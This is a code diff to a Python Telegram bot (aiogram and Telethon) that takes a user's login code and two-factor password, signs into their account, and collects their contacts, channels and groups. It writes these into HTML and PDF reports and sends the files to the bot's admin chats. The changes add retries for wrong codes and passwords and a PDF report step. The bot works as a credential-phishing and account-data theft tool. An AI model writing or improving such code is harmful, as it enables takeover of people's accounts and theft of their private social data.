@@ -5,8 +5,8 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
 from dotenv import load_dotenv
-from telethon.errors import SessionPasswordNeededError
 from datetime import datetime
 from defunc import *
 
@@ -124,6 +124,9 @@ async def get_code(message: types.Message):
     except SessionPasswordNeededError:
         await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
         user_data['awaiting_password'] = True
+    except PhoneCodeInvalidError:
+        user_data['attempts'] += 1
+        await message.reply(f"Неверный пин-код. У вас осталось {3 - user_data['attempts']} попыток.")
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
@@ -146,15 +149,16 @@ async def process_password(message: types.Message):
         await client.sign_in(password=password)
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
+    except PasswordHashInvalidError:
+        user_data['attempts'] += 1
+        await message.reply(f"Неверный пароль. У вас осталось {3 - user_data['attempts']} попыток.")
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
-        user_data['attempts'] += 1
         if user_data['attempts'] >= 3:
             user_state.pop(message.from_user.id, None)
         await client.log_out()
         await client.disconnect()
-
 
 # Функция для создания нового экземпляра клиента
 def create_client():
@@ -170,12 +174,12 @@ async def process_user_data(client, phone_number, user_id):
         groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
         total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userinfo, userid)
         await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
-        await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, user_id)
+        await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, blocked_bot_info, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html)
+        await generate_pdf_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, blocked_bot_info, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html)
         await send_files_to_bot(bot, admin_chat_ids, user_id)
     except Exception as e:
-        await client.disconnect()
-        raise e
-        
+        logging.error(f"Error processing user data: {e}")
+
 # Запуск бота
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
